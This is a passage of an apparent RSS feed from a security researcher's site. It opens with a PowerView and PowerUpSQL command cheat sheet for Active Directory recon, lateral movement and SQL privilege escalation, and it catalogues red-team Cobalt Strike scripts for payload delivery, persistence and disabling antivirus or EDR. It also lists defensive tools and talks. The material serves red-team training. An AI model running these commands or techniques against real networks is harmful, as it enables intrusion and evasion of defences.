&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainController&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-FullData&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">operatingsystem&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">description&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nv">$ip&lt;/span>&lt;span class="p">=[&lt;/span>&lt;span class="no">System.Net.Dns&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">GetHostAddresses&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">IPAddressToString&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">`t&lt;/span>&lt;span class="s2"> : &amp;#34;&lt;/span> &lt;span class="nv">$ip&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-ADSPath&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;---&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">samaccountname&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">description&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">where &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">mail&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-UserField&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-ComputerField&lt;/span> &lt;span class="n">-SearchField&lt;/span> &lt;span class="s2">&amp;#34;OperatingSystem&amp;#34;&lt;/span> &lt;span class="n">-SearchTerm&lt;/span> &lt;span class="s2">&amp;#34;windows&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPOGroup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetFileServer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ShareFinder&lt;/span> &lt;span class="n">-ExcludeStandard&lt;/span> &lt;span class="n">-ExcludeIPC&lt;/span> &lt;span class="n">-ExcludePrint&lt;/span> &lt;span class="n">-CheckShareAccess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectDN&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start to move laterally/escalate privileges&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-LocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-NoPing&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-WMILocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccessCreds&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;STUDENT01&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># User Hunting (default: Domain Admins)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-CheckAccess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Port Scanning (PowerSploit)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">100&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Privilege Escalation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-SPN&lt;/span> &lt;span class="c"># Kerberoasting&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-Unconstrained&lt;/span> &lt;span class="c"># Unconstrained delegation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-PreauthNotRequired&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="c"># ASREPRoasting (PowerView_dev)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span> &lt;span class="c"># Constrained delegation (user)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainComputer&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span> &lt;span class="c"># Constrained delegation (computer)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Look for interesting MSSQL instance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerUpSQL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfoThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAudit&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLEscalatePriv&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>FindWall</title><link>https://www.peco602.com/project/0030-findwall/</link><pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/project/0030-findwall/</guid><description>&lt;h2 id="what-does-it-do">What does it do?&lt;/h2>
&lt;p>FindWall is Python script that allows to understand if your network provider is limiting your access to the Internet by blocking any TCP/UDP port. In order to perform this check FindWall needs to connect a public VPS of your property. FindWall performs the following actions:&lt;/p>
&lt;ol>
&lt;li>Connects to the VPS via SSH&lt;/li>
&lt;li>Opens a port in listening mode&lt;/li>
&lt;li>Tries to connect to that port from the local machine&lt;/li>
&lt;li>Closes the port&lt;/li>
&lt;/ol>
&lt;h2 id="how-do-you-use-it">How do you use it?&lt;/h2>
&lt;img src="./demo.gif" width="100%"/>
&lt;p>To use FindWall you just need an account on a public VPS. The account must have root access if you want to test ports in the range &lt;code>1-1024&lt;/code>. The root account is also required to automatically install the tool &lt;code>nc&lt;/code> to open ports.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ pip install -r requirements
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ python findwall.py --help
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">=====================================================================================
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ███████╗██╗███╗ ██╗██████╗ ██╗ ██╗ █████╗ ██╗ ██╗
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ██╔════╝██║████╗ ██║██╔══██╗██║ ██║██╔══██╗██║ ██║
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> █████╗ ██║██╔██╗ ██║██║ ██║██║ █╗ ██║███████║██║ ██║
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ██╔══╝ ██║██║╚██╗██║██║ ██║██║███╗██║██╔══██║██║ ██║
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ██║ ██║██║ ╚████║██████╔╝╚███╔███╔╝██║ ██║███████╗███████╗
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ╚═╝ ╚═╝╚═╝ ╚═══╝╚═════╝ ╚══╝╚══╝ ╚═╝ ╚═╝╚══════╝╚══════╝
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">=====================================================================================
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">usage: findwall.py [-h] --ssh-host SSH_HOST [--ssh-port SSH_PORT] --ssh-username SSH_USERNAME [--ssh-password SSH_PASSWORD] [--ask-ssh-pass] [--ssh-key SSH_KEY] --ports PORTS [--udp]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> [--threads THREADS]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Check if someone is blocking you!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">optional arguments:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -h, --help show this help message and exit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --ssh-host SSH_HOST Remote host
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --ssh-port SSH_PORT Remote SSH port
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --ssh-username SSH_USERNAME
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Remote SSH username
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --ssh-password SSH_PASSWORD
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Remote SSH password
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --ask-ssh-pass Ask for remote SSH password
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --ssh-key SSH_KEY Remote SSH private key
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --ports PORTS Port range to scan (default: 1-1024)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --udp Scan in UDP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --threads THREADS Number of threads (default: 1)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As an example:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ python findwall.py --ssh-host 172.17.0.2 --ssh-port 22 --ssh-username test --ssh-password test --ports 8000-8010 --threads 3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>RustHunter</title><link>https://www.peco602.com/project/0020-rusthunter/</link><pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/project/0020-rusthunter/</guid><description>&lt;p>RustHunter is a modular incident response framework to build and compare environmental baselines. It is written in Rust and uses Ansible to collect data across multiple hosts.&lt;/p>
&lt;p>Due to the following features it can be also employed to perform threat hunting and incident handling:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Multi-Platform&lt;/strong>: it is able to collect data from both Windows, Linux and macOS machines;&lt;/li>
&lt;li>&lt;strong>Agentless&lt;/strong>: the usage of the Ansible technology based on SSH and WinRM allows to overcome the requirement of a local agent waiting for a task to be accomplished;&lt;/li>
&lt;li>&lt;strong>Easily Deployable&lt;/strong>: it is cross-platform and can be deployed both on premises and in a Cloud-based environment. A Bash and a PowerShell scripts have been developed to execute the tool respectively from a Linux and Windows machine;&lt;/li>
&lt;li>&lt;strong>Easily Expandable&lt;/strong>: it provides developer-ready Rust specifications offering an easy way to expand the product features by writing custom modules to collect additional machine data.&lt;/li>
&lt;/ul></description></item><item><title>Cyber range for space a way to optimize the cybersecurity process</title><link>https://www.peco602.com/talk/cyber-range-for-space-a-way-to-optimize-the-cybersecurity-process/</link><pubDate>Thu, 07 Apr 2022 14:00:00 +0000</pubDate><guid>https://www.peco602.com/talk/cyber-range-for-space-a-way-to-optimize-the-cybersecurity-process/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click on the &lt;strong>Slides&lt;/strong> button above to view the built-in slides feature.
&lt;/div>
&lt;/div>
Slides can be added in a few ways:
- **Create** slides using Wowchemy's [_Slides_](https://wowchemy.com/docs/managing-content/#create-slides) feature and link using `slides` parameter in the front matter of the talk file
- **Upload** an existing slide deck to `static/` and link using `url_slides` parameter in the front matter of the talk file
- **Embed** your slides (e.g. Google Slides) or presentation video on this page using [shortcodes](https://wowchemy.com/docs/writing-markdown-latex/).
Further event details, including [page elements](https://wowchemy.com/docs/writing-markdown-latex/) such as image galleries, can be added to the body of this page.
--></description></item><item><title>Cobalt Strike Aggressor Scripts</title><link>https://www.peco602.com/project/0010-cobaltstrike-aggressor-scripts/</link><pubDate>Mon, 03 Jan 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/project/0010-cobaltstrike-aggressor-scripts/</guid><description>&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>This is a collection of Cobalt Strike Aggressor scripts I developed and tested while I was a Red Team member for Locked Shields 2021.&lt;/p>
&lt;h2 id="initial-access">Initial Access&lt;/h2>
&lt;p>&lt;a href="https://attack.mitre.org/tactics/TA0001/" target="_blank" rel="noopener">Initial Access&lt;/a> consists of techniques that use various entry vectors to gain their initial foothold within a network.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>initial-access-cmd/initial-access-cmd.cna&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Certutil Web Delivery (Custom)&lt;/strong>: Provides a CMD one-liner to deliver a custom executable via Certutil&lt;/li>
&lt;li>&lt;strong>Certutil Web Delivery (Stageless)&lt;/strong>: Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via Certutil&lt;/li>
&lt;li>&lt;strong>Bitsadmin Web Delivery (Stageless)&lt;/strong>: Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via Bitsadmin&lt;/li>
&lt;li>&lt;strong>Regsvr32 Web Delivery (Stageless)&lt;/strong>: Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via Regsvr32&lt;/li>
&lt;li>&lt;strong>MSHTA Web Delivery (Stageless)&lt;/strong>: Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via MSHTA&lt;/li>
&lt;li>&lt;strong>Rundll32 Web Delivery (Stageless)&lt;/strong>: Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via Rundll32&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>initial-access-powershell/initial-access-powershell.cna&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Pure Powershell Web Delivery (Stageless)&lt;/strong>: Provides a PowerShell one-liner to deliver (in-memory) a stageless Cobalt Strike PoweShell payload&lt;/li>
&lt;li>&lt;strong>Artifact Powershell Web Delivery (Stageless)&lt;/strong>: Provides a PowerShell one-liner to deliver (in-memory) a PowerShell scripts which embeds a stageless Cobalt Strike payload&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>initial-access-python/initial-access-python.cna&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Python 2 Web Delivery&lt;/strong>: Provides a Python 2 one-liner to deliver a stageless Cobalt Strike payload (it assumes the following path for Python 2: &lt;em>c:\Python27\pythonw.exe&lt;/em>)&lt;/li>
&lt;li>&lt;strong>Python 3 Web Delivery&lt;/strong>: Provides a Python 3.9 one-liner to deliver a stageless Cobalt Strike payload (it assumes the following path for Python 3.9: &lt;em>C:\Python39\pythonw.exe&lt;/em>)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="persistence">Persistence&lt;/h2>
&lt;p>&lt;a href="https://attack.mitre.org/tactics/TA0003/" target="_blank" rel="noopener">Persistence&lt;/a> consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.&lt;/p>
&lt;ul>
&lt;li>&lt;code>persistence-sharpersist/persistence-sharpersist.cna&lt;/code>:
&lt;ul>
&lt;li>&lt;strong>* Startup Folder (Upload executable) [Reboot]&lt;/strong>: Installs persistence for all users by uploading an executable to the startup folder [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>Startup Folder (Upload executable) [Reboot]&lt;/strong>: Installs persistence for the current user by uploading an executable to the startup folder&lt;/li>
&lt;li>&lt;strong>* Windows Service (Powershell command) [Reboot]&lt;/strong>: Installs persistence for all users by creating a Windows service launching a PowerShell command [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Windows Service (Upload executable) [Reboot]&lt;/strong>: Installs persistence for all users by uploading an executable and creating a Windows service launching it [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Scheduled Task (Powershell command) [Logon/Hourly]&lt;/strong>: Installs persistence for all users by creating a Scheduled Task launching a PowerShell command [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Scheduled Task (Upload executable) [Logon/Hourly]&lt;/strong>: Installs persistence for all users by uploading an executable and creating a Scheduled Task launching it [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>Scheduled Task (Powershell command) [Logon/Hourly]&lt;/strong>: Installs persistence for the current user by creating a Scheduled Task launching a PowerShell command&lt;/li>
&lt;li>&lt;strong>Scheduled Task (Upload executable) [Logon/Hourly]&lt;/strong>: Installs persistence for the current user by uploading an executable and creating a Scheduled Task launching it&lt;/li>
&lt;li>&lt;strong>* Registry (Powershell command) [Logon]&lt;/strong>: Installs persistence for all users by adding a PowerShell command to an autorun registry key [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Registry (Upload executable) [Logon]&lt;/strong>: Installs persistence for all users by uploading an executable and adding it to an autorun registry key [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>Registry (Powershell command) [Logon]&lt;/strong>: Installs persistence for the current user by adding a PowerShell command to an autorun registry key [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>Registry (Upload executable) [Logon]&lt;/strong>: Installs persistence for the current user by uploading an executable and adding it to an autorun registry key&lt;/li>
&lt;li>&lt;strong>* Sticky Keys (CMD)&lt;/strong>: Launches a CMD prompt in case of sticky keys or other accessibility tools (e.g., Narrator, Magnifier) execution&lt;/li>
&lt;li>&lt;strong>* Sticky Keys (Beacon)&lt;/strong>: Launches a Cobalt Strike beacon in case of sticky keys or other accessibility tools (e.g., Narrator, Magnifier) execution&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="defense-evasion">Defense Evasion&lt;/h2>
&lt;p>&lt;a href="https://attack.mitre.org/tactics/TA0005/" target="_blank" rel="noopener">Defense Evasion&lt;/a> consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>evasion-disable-defender/evasion-disable-defender.cna&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>* Disable AV/Firewall&lt;/strong>: Disables Windows Defender [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Add Exclusions (Auto)&lt;/strong>: Automatically adds a list of paths and executables to the Windows Defender exclusions [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Add Exclusions (Custom)&lt;/strong>: Adds a custom path and executable to the Windows Defender exclusions [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Add Exclusions (Extensions)&lt;/strong>: Adds a custom file extension to the Windows Defender exclusions [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Remove Definitions&lt;/strong>: Removes Windows Defender definitions [Requires administrator privileges]&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>evasion-disable-edr/evasion-disable-edr.cna&lt;/code>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>* Kill EDRs&lt;/strong>: Tries to automatically kill all EDRs/AVs [Requires administrator privileges]&lt;/li>
&lt;li>&lt;strong>* Kill EDR (Custom)&lt;/strong>: Tries to kill a custom EDR/AV [Requires administrator privileges]&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>RedHerd Framework</title><link>https://www.peco602.com/talk/redherd-framework/</link><pubDate>Wed, 10 Nov 2021 14:00:00 +0000</pubDate><guid>https://www.peco602.com/talk/redherd-framework/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click on the &lt;strong>Slides&lt;/strong> button above to view the built-in slides feature.
&lt;/div>
&lt;/div>
Slides can be added in a few ways:
- **Create** slides using Wowchemy's [_Slides_](https://wowchemy.com/docs/managing-content/#create-slides) feature and link using `slides` parameter in the front matter of the talk file
- **Upload** an existing slide deck to `static/` and link using `url_slides` parameter in the front matter of the talk file
- **Embed** your slides (e.g. Google Slides) or presentation video on this page using [shortcodes](https://wowchemy.com/docs/writing-markdown-latex/).
Further event details, including [page elements](https://wowchemy.com/docs/writing-markdown-latex/) such as image galleries, can be added to the body of this page.
--></description></item><item><title>RedHerd Framework</title><link>https://www.peco602.com/project/0000-redherd-framework/</link><pubDate>Thu, 15 Jul 2021 00:00:00 +0000</pubDate><guid>https://www.peco602.com/project/0000-redherd-framework/</guid><description>&lt;p>RedHerd is a collaborative and serverless framework for orchestrating a geographically distributed group of assets capable of conducting simulating complex offensive cyberspace operations.&lt;/p>
&lt;iframe width="100%" height="400" src="https://www.youtube.com/embed/-AnJBcTwR8Q" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" style="margin-bottom: 30px;" allowfullscreen>&lt;/iframe>
&lt;p>The framework takes advantage of the &amp;ldquo;as a Service&amp;rdquo; paradigm in order to deploy a ready-to-use infrastructure that can also be adopted for effective training purposes, by reliably reproducing a real-world cyberspace scenario in which red and blue teams can challenge each other. RedHerd perfectly fits the Open Systems Architecture design pattern, thanks to the adoption of both open standards and wide-spread open source software components.&lt;/p></description></item><item><title>RedHerd: Offensive Cyberspace Operations as a Service</title><link>https://www.peco602.com/publication/0080-redherd-offensive-operations-service/</link><pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0080-redherd-offensive-operations-service/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
--></description></item><item><title>LTE Signal Fingerprinting Device-Free Passive Localization in Changing Environments</title><link>https://www.peco602.com/publication/0070-lte-fingerprinting-device-free-changing/</link><pubDate>Mon, 24 Feb 2020 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0070-lte-fingerprinting-device-free-changing/</guid><description>&lt;!--
&lt;div class="alert alert-note">
&lt;div>
Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
&lt;/div>
&lt;/div>
&lt;div class="alert alert-note">
&lt;div>
Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
&lt;/div>
&lt;/div>
